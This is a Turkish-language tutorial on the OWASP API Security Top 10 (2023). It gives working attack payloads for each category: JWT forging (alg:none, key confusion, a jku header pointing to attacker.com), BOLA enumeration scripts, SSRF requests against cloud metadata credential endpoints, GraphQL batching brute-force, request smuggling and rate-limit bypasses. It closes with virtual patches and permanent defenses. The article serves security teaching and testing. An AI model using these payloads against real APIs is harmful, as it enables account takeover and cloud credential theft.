<img width="1600" height="917" alt="api" src="https://github.com/user-attachments/assets/1ef1e7b0-05ef-4fcc-beb6-c9403dcbb0c5" />

**API Security**, klasik web uygulaması güvenliğinden farklı bir disiplindir. Bir web sayfası kullanıcıya sınırlı bir arayüz sunarken, bir API genellikle **her fonksiyonu, her veri modelini ve her iş akışını doğrudan dışarıya açar**. Bu yüzden API'lerde saldırı yüzeyi çok daha geniştir ve hatalar çok daha kolay istismar edilebilir hale gelir.

OWASP, bu farkı gözeterek **API Security Top 10**'u klasik OWASP Top 10'dan ayrı bir liste olarak yayınlar. 2023 revizyonu, 2019 listesine göre önemli değişiklikler içerir: bazı kategoriler birleştirilmiş (Excessive Data Exposure + Mass Assignment → Broken Object Property Level Authorization), bazıları tamamen yeni eklenmiştir (Unrestricted Resource Consumption, Unrestricted Access to Sensitive Business Flows, Unsafe Consumption of APIs).

Bu yazıda listenin her bir maddesini gerçek payload örnekleriyle inceleyeceğiz; savunma önerilerini ise tekrarı azaltmak için yazının sonunda tek bir bölümde topluca vereceğiz.

---

## API Mimarileri: REST, SOAP ve GraphQL Hızlı Tanıtım

Payload örneklerine geçmeden önce, üç yaygın API mimarisini kısaca ayırt etmek gerekir — çünkü aynı zafiyet (örn. BOLA), her mimaride **farklı bir yüzeyde** karşımıza çıkar.

### REST (Representational State Transfer)

Bugün en yaygın kullanılan API mimarisidir. Kaynaklar URL yolları üzerinden temsil edilir, HTTP metodları (GET/POST/PUT/DELETE) işlemi belirtir, veri genellikle JSON formatındadır.

```
GET /api/v1/orders/8841
POST /api/v1/orders
DELETE /api/v1/orders/8841
```

* Her kaynak kendi URL'sine sahiptir → saldırı yüzeyi endpoint sayısı kadar geniştir
* Durumsuzdur (stateless) → her istekte kimlik doğrulama tekrar taşınır (genellikle token)
* En çok karşılaşılan zafiyetler: BOLA, BFLA, Mass Assignment

### SOAP (Simple Object Access Protocol)

Daha eski, kurumsal (bankacılık, sigorta, kamu) sistemlerde hâlâ yaygın olan, XML tabanlı katı bir protokoldür. WSDL (Web Services Description Language) dosyası ile servisin tüm işlemleri, parametreleri ve tipleri **önceden tanımlanır**.

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOrder xmlns="http://target.com/orders">
      <OrderId>8841</OrderId>
    </GetOrder>
  </soap:Body>
</soap:Envelope>
```

* XML tabanlı olduğu için klasik **XXE (XML External Entity)** ve XML injection saldırılarına açıktır
* WSDL dosyası genellikle herkese açık bırakılır (`?wsdl`) ve tüm servis haritasını sızdırır
* Yetkilendirme genellikle SOAP header'ı içindeki özel token/credential alanlarına dayanır — bu alanlar kontrol edilmezse klasik BOLA/BFLA aynen geçerlidir

### GraphQL

Tek bir endpoint (`/graphql`) üzerinden, istemcinin **tam olarak ihtiyacı olan veriyi** sorgulamasına izin veren esnek bir sorgu dilidir.

```graphql
query {
  order(id: 8841) {
    id
    total
    customer { name email }
  }
}
```

* REST'teki "her kaynağın kendi endpoint'i" mantığı yoktur — tüm veri modeli tek noktadan erişilebilir olduğu için yetkilendirme **resolver seviyesinde** (her alan için ayrı ayrı) yapılmak zorundadır
* Introspection, batching ve iç içe sorgu gibi GraphQL'e özgü ek saldırı yüzeyleri vardır
* Schema tek bir yerde toplandığı için, tek bir eksik kontrol tüm veri modelini etkileyebilir

> Bu üç mimarinin ortak paydası: **hangi teknoloji kullanılırsa kullanılsın, "bu isteği yapan, bu kaynağa/fonksiyona erişmeye yetkili mi?" sorusu backend'de sorulmuyorsa, zafiyet oluşur.** Aşağıdaki OWASP API Top 10 maddeleri bu ortak kökten türeyen farklı görünümlerdir.

---

## API1:2023 — Broken Object Level Authorization (BOLA)

BOLA, API dünyasının en yaygın ve en yıkıcı zafiyetidir. Web tarafındaki karşılığı IDOR'dur, ancak API'lerde her endpoint doğrudan bir nesne/kaynak ID'si üzerinden çalıştığı için etki alanı çok daha geniştir.

```
GET /api/v1/orders/8841
Authorization: Bearer <kullanici_A_token>
```

Backend `8841` numaralı siparişin gerçekten istek sahibine ait olup olmadığını kontrol etmezse, saldırgan sadece ID'yi değiştirerek başka kullanıcıların verisine ulaşır.

### Gelişmiş BOLA Teknikleri

**Nested (İç İçe) Kaynak Manipülasyonu:** Modern API'ler genellikle kaynakları hiyerarşik olarak sunar. Yetki kontrolü çoğu zaman sadece **üst seviyede** yapılır, alt kaynaklarda unutulur.

```
GET /api/v1/companies/12/departments/5/employees/301
```

Eğer sunucu sadece `companies/12`'nin istek sahibine ait olup olmadığını kontrol edip, `departments/5` ve `employees/301` değerlerinin gerçekten `companies/12`'ye bağlı olduğunu doğrulamazsa, saldırgan bu ID'leri farklı şirketlere ait değerlerle değiştirerek çapraz erişim sağlayabilir:

```
GET /api/v1/companies/12/departments/9931/employees/77482
```

Burada `9931` ve `77482`, aslında `company 45`'e ait olabilir — ancak URL'nin başında saldırganın kendi `companies/12` ID'si göründüğü için yüzeysel kontroller bunu "kendi verisi" sanabilir.

**Array-Based ID Enjeksiyonu:** Toplu işlem yapan endpoint'lerde ID'ler dizi olarak gönderilir. Yetki kontrolü dizinin sadece ilk elemanında yapılıyorsa, geri kalanlar sızabilir.

```json
POST /api/v1/invoices/batch-export
{
  "invoice_ids": [8841, 8842, 55210, 55211]
}
```

**UUID Tahmini/Sızdırma:** UUIDv1 zaman damgası + MAC adresinden türetildiği için, kayıt oluşturulma zamanı biliniyorsa arama uzayı ciddi şekilde daraltılabilir. Ayrıca liste (`GET /api/v1/resources`) endpoint'leri yetki filtresi olmadan tüm UUID'leri döndürüyorsa, "tahmin edilemez ID" savunması tamamen anlamsızlaşır.

```python
for i in range(1, 100000):
    r = requests.get(f"https://api.target.com/v1/orders/{i}", headers=headers)
    if r.status_code == 200:
        print(f"Erişildi: {i}")
```

---

## API2:2023 — Broken Authentication

Kimlik doğrulama mekanizmalarının zayıf tasarımı veya hatalı implementasyonu, saldırganın başka kullanıcıların kimliğini geçici veya kalıcı olarak ele geçirmesine izin verir.

### JWT Atakları

**`alg: none` Saldırısı:** Sunucu, header'daki `alg` değerini doğrulamadan işlemi kabul ediyorsa, saldırgan imza doğrulamasını tamamen devre dışı bırakabilir.

```json
{ "alg": "none", "typ": "JWT" }
```

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b'=')
token = header + b'.' + payload + b'.'
print(token.decode())
```

**Algoritma Karışıklığı (Key Confusion — RS256 → HS256):** Sunucu RS256 (asimetrik) bekliyor ama doğrulama kodu hem RS256 hem HS256'yı kabul edecek şekilde yazılmışsa, saldırgan public key'i HMAC secret'ı olarak kullanıp geçerli görünen sahte bir token üretebilir:

```python
import jwt

public_key = open("server_public_key.pem").read()
forged_token = jwt.encode(
    {"user_id": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

**Zayıf Secret Brute-Force:** HS256 imzalı token'larda secret zayıfsa (`secret`, `123456`, şirket adı vb.) offline brute-force ile kırılabilir:

```bash
python3 jwt_tool.py <token> -C -d rockyou.txt
```

**JWKS Enjeksiyonu:** Bazı sunucular, token header'ındaki `jku` (JWK Set URL) veya `kid` (Key ID) alanını doğrulamadan kullanır. Saldırgan `jku` değerini kendi kontrolündeki bir sunucuya işaret edecek şekilde değiştirip, o adreste kendi ürettiği public key'i barındırırsa, sunucu saldırganın imzasını "geçerli" olarak kabul eder.

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json",
  "kid": "attacker-key-1"
}
```

### OAuth 2.0 / OIDC Zafiyetleri

**State Parametresi Eksikliği (CSRF):** Yetkilendirme akışında `state` parametresi kullanılmıyor veya doğrulanmıyorsa, saldırgan kendi authorization code'unu kurbanın oturumuna bağlayarak hesap ele geçirme (account takeover) gerçekleştirebilir.

**`redirect_uri` Manipülasyonu:** Sunucu `redirect_uri`'yi tam eşleşme yerine gevşek (prefix/substring) kontrol ediyorsa:

```
https://accounts.target.com/oauth/authorize?
  client_id=abc123&
  redirect_uri=https://app.target.com.attacker.com/callback&
  response_type=code&
  scope=profile
```

Authorization code, saldırganın kontrolündeki domaine yönlendirilir ve token'a çevrilebilir.

**Authorization Code Interception:** PKCE (Proof Key for Code Exchange) kullanılmıyorsa, mobil/native uygulamalarda code, uygulama içi tarayıcı veya log üzerinden sızabilir; saldırgan bu code'u kendi client'ıyla token'a çevirebilir.

---

## API3:2023 — Broken Object Property Level Authorization

2019 listesindeki **Excessive Data Exposure** ve **Mass Assignment** kategorilerinin birleşimidir. Ortak kök neden: yetkilendirme kontrolü nesne (object) seviyesinde yapılsa da, **nesnenin içindeki tekil alanlar (property)** seviyesinde yapılmaz.

### Excessive Data Exposure (Aşırı Veri Sızıntısı)

Backend, veritabanı nesnesini olduğu gibi frontend'e dönerse, istemcinin göstermediği ama response'da bulunan alanlar sızar:

```json
GET /api/v1/users/44

{
  "id": 44,
  "name": "Ahmet",
  "email": "ahmet@mail.com",
  "password_hash": "$2b$12$...",
  "internal_credit_score": 812,
  "is_admin": false
}
```

Frontend sadece `name` ve `email`'i gösterse bile, response'un tamamı network sekmesinde/API log'unda görünür durumdadır.

### Mass Assignment (Toplu Atama)

```json
PUT /api/v1/profile
{
  "name": "Ahmet",
  "email": "ahmet@mail.com",
  "is_admin": true,
  "account_balance": 999999
}
```

Backend gelen tüm alanları filtrelemeden nesneye yazıyorsa, saldırgan normalde erişemeyeceği alanları (`is_admin`, `account_balance`) değiştirerek doğrudan yetki yükseltmesi yapar.

---

## API4:2023 — Unrestricted Resource Consumption

2019'daki "Lack of Resources & Rate Limiting" kategorisinin genişletilmiş hâlidir. Sadece istek sayısı değil; CPU, bellek, depolama, ağ bant genişliği ve ücretli üçüncü taraf entegrasyonları (SMS, e-posta, biyometrik doğrulama) da kaynak tüketimi kapsamındadır.

**Örnek saldırı vektörleri:**

* **Büyük payload saldırısı:** `limit` veya `page_size` parametresine aşırı büyük değer vererek sunucuyu aşırı veri döndürmeye zorlamak:

```
GET /api/v1/search?query=a&page_size=999999999
```

* **Pahalı işlemleri tetikleme:** PDF oluşturma, resim işleme, regex tabanlı arama gibi CPU-yoğun endpoint'leri paralel ve tekrar tekrar çağırarak DoS oluşturmak.
* **Maliyetli üçüncü taraf servisleri kötüye kullanma:** SMS/OTP gönderen bir endpoint'e rate limit yoksa, saldırgan binlerce SMS tetikleyip hem kurbanı rahatsız eder hem de şirkete doğrudan finansal zarar verir.

```
POST /api/v1/auth/send-otp
{ "phone": "+905xx1234567" }
```

Bu istek saniyede yüzlerce kez gönderilebiliyorsa, hem DoS hem de gerçek para maliyeti (SMS başına ücret) oluşur.

---

## API5:2023 — Broken Function Level Authorization (BFLA)

BOLA "hangi veriye erişebiliyorum" sorusuyken, BFLA "hangi **fonksiyona** erişebiliyorum" sorusuyla ilgilidir. Karmaşık rol hiyerarşilerinde, yönetimsel fonksiyonlar ile normal kullanıcı fonksiyonları arasındaki ayrım net değilse ortaya çıkar.

```
GET /api/v1/users          → normal kullanıcı: 403 (beklenen)
GET /api/v1/admin/users    → normal kullanıcı: 200 (BFLA!)
```

Saldırgan genellikle HTTP metodu değiştirerek de bu korumayı atlatmaya çalışır:

```
DELETE /api/v1/users/44   → normal kullanıcı token'ıyla, admin-only fonksiyon
```

veya API dokümantasyonunda/JS bundle'ında referansı bulunan ama frontend'de gösterilmeyen "gizli" admin endpoint'lerini keşfederek:

```
POST /api/v1/internal/users/44/reset-password
```

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

Bu kategori, klasik bir "implementasyon hatası" değildir — **iş mantığının kötüye kullanıma karşı düşünülmemiş olmasıdır**. API teknik olarak doğru çalışır, ama otomatikleştirilmiş/aşırı kullanım işletmeye zarar verir.

**Örnek senaryolar:**

* **Bilet alım botları:** Konser bileti satan bir API, tek kullanıcının saniyede onlarca bilet satın almasını engellemiyorsa, botlar tüm stoku anında tüketir.
* **Yorum/oy spam'i:** `POST /api/v1/comments` endpoint'i CAPTCHA veya davranışsal kontrol içermiyorsa, otomatik script'lerle binlerce sahte yorum/oy üretilebilir.
* **Fiyat kazıma (scraping) + rekabet manipülasyonu:** Bir e-ticaret API'si fiyat bilgisini sınırsız sorgulamaya izin veriyorsa, rakip firmalar fiyatları anlık izleyip otomatik fiyat savaşı başlatabilir.
* **Hesap oluşturma spam'i:** Kayıt endpoint'i e-posta doğrulaması ve rate limit içermiyorsa, saldırgan binlerce sahte hesap oluşturup promosyon/referral sistemini istismar edebilir.

```
POST /api/v1/tickets/purchase
{ "event_id": 501, "quantity": 50 }
```

Tek bir hesabın tek istekte 50 bilet alabilmesi, saniyede yüzlerce paralel istekle birleştiğinde stokun botlar tarafından anında tüketilmesine yol açar.

---

## API7:2023 — Server Side Request Forgery (SSRF)

API'nin, kullanıcıdan gelen bir URI'yi doğrulamadan sunucu tarafında istek atması sonucu oluşur. Saldırgan, sunucuyu **kendi adına** normalde erişemeyeceği iç ağ kaynaklarına istek atmaya zorlar.

**Tipik zafiyetli senaryo — webhook/URL önizleme:**

```json
POST /api/v1/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

Sunucu bu URL'ye istek atarsa, AWS/Azure/GCP metadata servisi üzerinden **geçici IAM kimlik bilgileri** sızabilir — bu, bulut ortamlarında SSRF'in en kritik sonucudur.

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Dönen yanıt genellikle `AccessKeyId`, `SecretAccessKey` ve `Token` içerir; bu bilgilerle saldırgan AWS CLI üzerinden bulut kaynaklarına doğrudan erişebilir.

**Dosya yükleme üzerinden SSRF:**

```json
POST /api/v1/avatar/import
{ "image_url": "http://internal-admin-panel.local/export?format=json" }
```

Sunucu bu adrese istek atıp içeriği "resim" olarak işlemeye çalışırken, aslında iç ağdaki korumasız bir admin panelinin çıktısını saldırgana (hata mesajı, response süresi farkı vb. yollarla) sızdırabilir.

**Bulut sağlayıcılara göre metadata endpoint'leri:**

| Bulut Sağlayıcı | Metadata Endpoint |
|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

Azure ve GCP metadata servisleri ek bir header zorunlu kıldığı için (`Metadata: true` / `Metadata-Flavor: Google`), SSRF zafiyeti sadece URL'i kontrol edebiliyorsa ama header ekleyemiyorsa bu sağlayıcılarda daha zor istismar edilir.

---

## API8:2023 — Security Misconfiguration

API'lerin ve destekleyici altyapının karmaşık yapılandırma seçenekleri, güvenlik en iyi pratiklerine uyulmadığında geniş bir saldırı yüzeyi açar.

**Yaygın örnekler:**

* Gereksiz HTTP metodlarının açık bırakılması (`TRACE`, `PUT`, `DELETE` production'da kapatılmamış)
* Detaylı hata mesajları / stack trace'lerin production'da görünür olması
* CORS yapılandırmasının aşırı gevşek olması
* Varsayılan (default) kimlik bilgileriyle açık kalmış admin/monitoring panelleri
* Güvenlik header'larının eksikliği (`Strict-Transport-Security`, `X-Content-Type-Options`)

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Bu kombinasyon teorik olarak tarayıcılar tarafından reddedilir, ancak bazı proxy/gateway katmanları veya eski tarayıcı davranışları nedeniyle credential içeren cross-origin isteklerin sızmasına yol açabilecek yapılandırma hataları hâlâ karşımıza çıkar.

```
OPTIONS /api/v1/admin/users HTTP/1.1
Host: target.com
```

Production'da `TRACE`/`OPTIONS` gibi metodlar açık bırakıldığında, sunucu konfigürasyonu (versiyon, desteklenen metodlar, bazen internal header'lar) response üzerinden sızabilir.

---

## API9:2023 — Improper Inventory Management

API'ler, geleneksel web uygulamalarına göre çok daha fazla endpoint açığa çıkarır ve versiyonlama süreçleri karmaşıklaştıkça **hangi API'nin hâlâ aktif olduğunu takip etmek zorlaşır.**

**Tipik senaryolar:**

* Eski API versiyonlarının (`/v1/`) yeni versiyon (`/v2/`) yayına alındıktan sonra kapatılmaması — genellikle `/v1/` daha az güvenlik güncellemesi almıştır ve zafiyetli kalır.
* Test/staging ortamlarının production domain altında unutulmuş olması (`api-staging.target.com`, `api-dev.target.com`)
* Debug/internal amaçlı eklenip kaldırılması unutulan endpoint'ler (`/api/v1/debug/dump-db`)
* Aynı API'ye erişen farklı istemcilerin (mobil app, web, partner entegrasyonu) farklı yetkilendirme seviyeleri kullanması ve bu farkın belgelenmemesi

**Keşif teknikleri:**

```bash
# Subdomain/versiyon taraması
subfinder -d target.com | grep -i api
```

```bash
# JS bundle içinde gizli endpoint referanslarını arama
grep -rEo '"/api/v[0-9]+/[a-zA-Z0-9_/-]+"' bundle.js | sort -u
```

Swagger/OpenAPI dosyalarının erişilebilir bırakılması (`/swagger.json`, `/api-docs`) da tam bir endpoint envanteri sunarak saldırganın işini kolaylaştırır.

```
GET /api-docs
GET /v1/swagger.json
GET /v2/api-docs
```

---

## API10:2023 — Unsafe Consumption of APIs

Geliştiriciler genellikle kullanıcı girdisine şüpheyle yaklaşırken, **üçüncü taraf API'lerden gelen veriye** aynı titizliği göstermez. Saldırganlar bu asimetriyi hedefleyerek, entegre edilen dış servisi ele geçirip veya taklit edip hedef API'ye ulaşır.

**Tipik zafiyetli senaryo:**

```python
# ❌ Riskli: üçüncü taraf API yanıtı doğrudan işleniyor, doğrulama yok
response = requests.get("https://partner-api.example.com/user-data")
data = response.json()
db.execute(f"INSERT INTO logs (info) VALUES ('{data['note']}')")  # SQL Injection riski
```

Burada geliştirici "bu veri güvenilir bir partnerden geliyor" varsayımıyla, gelen veriyi hiç doğrulamadan hem SQL sorgusuna hem de muhtemelen frontend'e (XSS riski) aktarır. Eğer partner API ele geçirilirse veya araya bir MITM (man-in-the-middle) girerse, saldırgan zincirleme olarak hedef sisteme kadar ulaşabilir.

**Diğer riskler:**

* TLS sertifika doğrulamasının üçüncü taraf istekleri için gevşetilmesi (`verify=False`)
* Redirect zincirlerinin sınırsız takip edilmesi (üçüncü taraf API'yi taklit eden bir redirect zinciriyle SSRF benzeri sonuçlar)
* Üçüncü taraf API'den gelen dosya/URL referanslarının doğrudan işlenmesi

---

## Mimari ve Protokol Bazlı İleri Seviye Zafiyetler

### GraphQL Pentest

**Introspection İstismarı:** Production'da introspection kapatılmamışsa, saldırgan tüm şemayı (tip, alan, mutation) tek sorguyla çıkarabilir:

```graphql
query {
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}
```

**Derin/İç İçe Sorgu (Circular Query) DoS:**

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

**Batching ile Rate-Limit Atlatma:**

```graphql
query {
  a1: login(username: "admin", password: "123456") { token }
  a2: login(username: "admin", password: "password") { token }
  a3: login(username: "admin", password: "admin123") { token }
  # ... yüzlerce alias
}
```

Bu tek bir HTTP isteği olduğu için IP/istek bazlı rate limiter'ı görünürde hiç tetiklemez.

**GraphQL Injection:** Resolver fonksiyonu, gelen argümanı doğrudan bir veritabanı sorgusuna (SQL/NoSQL) string olarak birleştiriyorsa, klasik injection mantığı GraphQL üzerinden de çalışır.

### gRPC ve WebSocket Güvenliği

**gRPC test yaklaşımı:**

```bash
# .proto dosyası biliniyorsa doğrudan kullanılır
grpcurl -plaintext -d '{"user_id": 1044}' target.com:50051 UserService/GetUser
```

```bash
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe UserService
```

Reflection kapalıysa, ikili trafik yakalanıp (mitmproxy + gRPC eklentisi) Protobuf mesaj yapısı tersine mühendislikle çıkarılmaya çalışılır.

**WebSocket üzerinden BOLA:**

```javascript
const ws = new WebSocket("wss://target.com/ws?token=" + stolenToken);
ws.onopen = () => {
  ws.send(JSON.stringify({ action: "get_messages", user_id: 1045 }));
};
```

Bağlantı bir kez kurulduktan sonra, saldırgan mesaj içindeki `user_id` gibi parametreleri değiştirerek WebSocket üzerinden de BOLA gerçekleştirebilir — çünkü sunucu genellikle her mesajda değil, sadece handshake anında yetki kontrolü yapar.

---

## Altyapı ve Atlatma (Bypass) Teknikleri

### API Gateway / WAF Atlatma

**Parametre Kirliliği (HPP):**

```
POST /api/v1/transfer?amount=10&amount=100000
```

**HTTP Request Smuggling:**

```
POST /api/v1/data HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /api/v1/admin/users HTTP/1.1
Host: target.com
```

**Parser Farklılıkları:**

```json
{ "role": "user", "role": "admin" }
```

**IP Rotasyonu ile Filtre Atlatma:** IP bazlı WAF kuralları (rate limit, coğrafi engel) varsa, saldırgan proxy/VPN havuzları veya bulut fonksiyonları (her istek farklı IP'den) kullanarak filtreyi etkisiz hale getirebilir.

### Rate Limit Atlatma

**Header Manipülasyonu:**

```
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 5.6.7.8
X-Real-IP: 9.10.11.12
```

**Boşluk/Encoding Manipülasyonu:**

```
POST /api/v1/login
POST /api/v1/login/
POST /API/v1/LOGIN
POST /api/v1/login%20
```

**Login/OTP Mantık Hataları:** OTP doğrulama endpoint'i, deneme sayısını `user_id` yerine `session_id` bazında sayıyorsa, saldırgan her denemede yeni bir session başlatarak deneme sayısı limitini anlamsız hale getirebilir.

---

## Kod Analizi ve Otomasyon (DevSecOps)

### White-Box API Pentest

**Node.js (Express) route keşfi:**

```bash
grep -rEn "router\.(get|post|put|delete|patch)\(" src/ | sort
```

**Go route keşfi (Gin/Echo):**

```bash
grep -rEn "\.(GET|POST|PUT|DELETE|PATCH)\(" --include="*.go" .
```

**Python (FastAPI/Flask) route keşfi:**

```bash
grep -rEn "@app\.(route|get|post|put|delete)" .
```

```bash
# Yetki middleware'i olmayan route'ları bulmaya yönelik basit bir ön filtre
grep -B2 -E "\.(get|post|put|delete)\(" src/routes/*.js | grep -v "authMiddleware\|requireAuth"
```

### Özel Script ile Karmaşık API Akışlarını Simüle Etme

```python
import asyncio
import aiohttp

BASE = "https://api.target.com"

async def login(session, username, password):
    async with session.post(f"{BASE}/auth/login", json={"username": username, "password": password}) as r:
        data = await r.json()
        return data["token"]

async def test_bola(session, token, resource_ids):
    headers = {"Authorization": f"Bearer {token}"}
    results = []
    for rid in resource_ids:
        async with session.get(f"{BASE}/v1/orders/{rid}", headers=headers) as r:
            if r.status == 200:
                results.append(rid)
    return results

async def main():
    async with aiohttp.ClientSession() as session:
        token = await login(session, "userB", "test1234")
        leaked = await test_bola(session, token, range(1000, 2000))
        print(f"[+] Erişilebilen kayıt sayısı: {len(leaked)} -> {leaked[:20]}")

asyncio.run(main())
```

Go ile yazılan eşdeğerleri, yüksek eşzamanlılık gerektiren büyük ölçekli taramalarda (goroutine'lerin hafifliği sayesinde) genellikle daha performanslıdır ve CI/CD pipeline'larına entegre "sürekli yetkilendirme testi" (continuous authorization testing) adımı olarak eklenebilir.

---

## Virtual Patch

Gerçek dünyada "doğru" çözüm (merkezi yetkilendirme katmanı, DTO'lar, resource-based authorization, schema-level GraphQL kontrolleri) hazır olana kadar, ilgili endpoint(ler)e **mimariyi değiştirmeden** uygulanabilecek, saatler içinde devreye alınabilen bir **virtual patch (sanal yama)** gerekir. Amaç kalıcı fix değil, kanamayı hemen durdurmaktır.

**1. Gateway/Proxy Seviyesinde Geçici Yetki Filtresi**

Kod tabanına dokunmadan, API gateway veya reverse proxy seviyesinde ilgili path için ek bir kontrol kuralı eklenir. Bu, saldırının backend'e ulaşmadan durdurulmasını sağlar.

```nginx
# NGINX örneği: belirli bir path'e sadece belirli claim'e sahip token ile izin ver
location /api/v1/orders/ {
    auth_request /_verify_owner;
    proxy_pass http://backend;
}
```

**2. BOLA/BFLA İçin Geçici Middleware Guard**

Etkilenen route grubunun önüne, mevcut kodu değiştirmeden **tek bir kontrol noktası** eklenir.

```javascript
// Tüm /api/v1/orders/:id rotalarının önüne eklenen geçici guard
app.use('/api/v1/orders/:id', async (req, res, next) => {
  const order = await Order.findById(req.params.id);
  if (!order || order.ownerId !== req.user.id) return res.status(403).end();
  next();
});
```

**3. Mass Assignment İçin Acil Alan Filtreleme (Field Whitelist Patch)**

Backend'in tamamını DTO'ya geçirmeye vakit yoksa, sadece güncelleme endpoint'inin başına 3 satırlık bir filtre eklenir.

```python
DANGEROUS_FIELDS = {"is_admin", "role", "account_balance", "tenant_id"}
for field in DANGEROUS_FIELDS:
    request.json.pop(field, None)  # istekten tehlikeli alanları anında çıkar
```

**4. Rate Limit / Kaynak Tüketimi İçin Acil Sert Limit**

Gerçek limit mantığı kurulana kadar, saldırıya açık endpoint'e geçici olarak agresif bir sınır konur — kullanıcı deneyimi biraz etkilense de risk anında düşer.

```python
@limiter.limit("5 per minute")  # kalıcı çözüm gelene kadar geçici sert limit
@app.route('/api/v1/auth/send-otp', methods=['POST'])
def send_otp(): ...
```

**5. SSRF İçin Acil IP/Domain Whitelist**

Webhook/URL-import gibi SSRF'e açık endpoint'lere, mimariyi değiştirmeden sadece bir doğrulama fonksiyonu eklenir.

```python
import ipaddress, socket

def is_safe_url(url):
    host = urlparse(url).hostname
    ip = socket.gethostbyname(host)
    return not ipaddress.ip_address(ip).is_private  # private/metadata IP'leri anında reddet

if not is_safe_url(request.json["callback_url"]):
    return abort(400)
```

**6. GraphQL İçin Acil Introspection Kapatma + Derinlik Sınırı**

Production'da unutulmuş introspection ve derinlik kontrolü, tek satırlık konfigürasyon değişiklikleriyle anında kapatılabilir.

```javascript
const server = new ApolloServer({
  schema,
  introspection: false, // production'da anında kapat
  validationRules: [depthLimit(5)] // iç içe sorgu DoS'unu anında sınırla
});
```

**Dikkat edilmesi gerekenler:**

* Bu yamalar **geçicidir** — asıl çözüm hâlâ merkezi, resource/property/function seviyesinde yetkilendirmenin kod tabanına kalıcı olarak eklenmesidir.
* Gateway seviyesinde eklenen kurallar, **backend'e doğrudan erişebilen** başka bir yol (internal network, farklı bir gateway, eski API versiyonu) varsa etkisiz kalır — envanteri (API9) mutlaka kontrol edin.
* Sert rate limit gibi acil önlemler gerçek kullanıcıları da etkileyebilir; izleme (monitoring) ile yan etkiler takip edilmeli.
* Yama production'a alındıktan sonra, kalıcı fix **backlog'a değil aynı sprint'e** yazılmalı — aksi halde "geçici" çözüm kalıcılaşır ve unutulur.
* Her virtual patch, ilgili tüm alternatif endpoint'lere (export, internal, v1/v2, bulk) da uygulanmalı; tek bir yol kapatılıp diğerleri unutulursa açık aslında kapanmamış olur.

---

## Genel Kural

> API güvenliği, tek bir güvenlik duvarı veya tek bir kontrol noktasıyla çözülemez.
> Her katman — gateway, authentication, authorization, business logic, üçüncü taraf entegrasyon — **kendi başına** güvenli olmak zorundadır.

* Object + Property + Function seviyesinde yetkilendirme → her zaman backend'de, deny-by-default
* Kaynak tüketimi ve iş akışı kötüye kullanımı → teknik kontrol kadar davranışsal/iş mantığı kontrolü de gerektirir
* SSRF ve üçüncü taraf entegrasyonlar → "dış kaynak" güvenilir değildir, kullanıcı girdisi gibi ele alınmalıdır
* Envanter ve konfigürasyon → görünmeyen/unutulan API, test edilmeyen API demektir

---

## Savunma — Tüm Kategoriler İçin Kalıcı Çözümler

### API1 — BOLA
```javascript
// ✅ sahiplik kontrolü query'ye dahil
const order = await Order.findOne({ _id: req.params.id, ownerId: req.user.id });
if (!order) return res.status(403).json({ error: 'Yetkisiz erişim' });
```
Nested kaynaklarda **her seviyede** bağlılık doğrulanmalı (department gerçekten o company'ye mi ait, employee gerçekten o department'a mı ait).

### API2 — Broken Authentication
* JWT `alg` header'ı sunucuda sabitlensin ve whitelist yapılsın (`HS256` bekleniyorsa `RS256`/`none` reddedilmeli)
* `jku`/`jwk` gibi dışarıdan gelen anahtar referanslarına asla güvenilmesin — sabit, önceden tanımlı key set kullanılsın
* OAuth akışlarında `state` zorunlu olsun ve session'a bağlı doğrulansın
* `redirect_uri` **tam eşleşme (exact match)** ile kontrol edilsin
* Mobil/SPA istemcilerde PKCE zorunlu tutulsun

### API3 — Broken Object Property Level Authorization
```python
# ✅ explicit whitelist — hem input hem output için
ALLOWED_INPUT = {"name", "email"}
ALLOWED_OUTPUT = {"id", "name", "email"}
```
**DTO (Data Transfer Object) kullanın**, backend nesnesini asla doğrudan serialize edip dönmeyin veya doğrudan request body'sinden nesneye map etmeyin.

### API4 — Unrestricted Resource Consumption
* Her endpoint için istek başına kaynak limiti (payload boyutu, sayfalama üst sınırı, timeout) tanımlayın
* Kullanıcı/IP bazlı rate limiting + maliyetli işlemler için ayrı, daha sıkı limitler uygulayın
* Üçüncü taraf servis çağıran endpoint'lerde günlük/saatlik kota uygulayın

### API5 — BFLA
* Fonksiyon seviyesinde yetkilendirmeyi merkezi bir middleware/guard katmanında zorunlu kılın
* RBAC'ı deny-by-default mantığıyla kurun
* Admin ve normal kullanıcı endpoint'lerini ayrı route prefix'leri + ayrı middleware zincirleriyle izole edin

### API6 — Unrestricted Access to Sensitive Business Flows
* Kritik iş akışlarını (satın alma, kayıt, oylama) hız/sıklık/cihaz parmak izi analizleriyle davranışsal olarak da koruyun
* CAPTCHA ve bot tespiti kritik akışlara entegre edilsin
* İş biriminden "bu fonksiyon otomatik/toplu kullanılırsa ne kaybederiz?" sorusu güvenlik ekibiyle birlikte cevaplanmalı

### API7 — SSRF
* Kullanıcıdan gelen URL'ler **whitelist** ile sınırlandırılsın
* Private IP aralıklarına (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`, `192.168.0.0/16`) giden istekler sunucu seviyesinde engellensin
* Bulut ortamlarında IMDSv2 zorunlu kılınmalı, IMDSv1 tamamen kapatılmalı
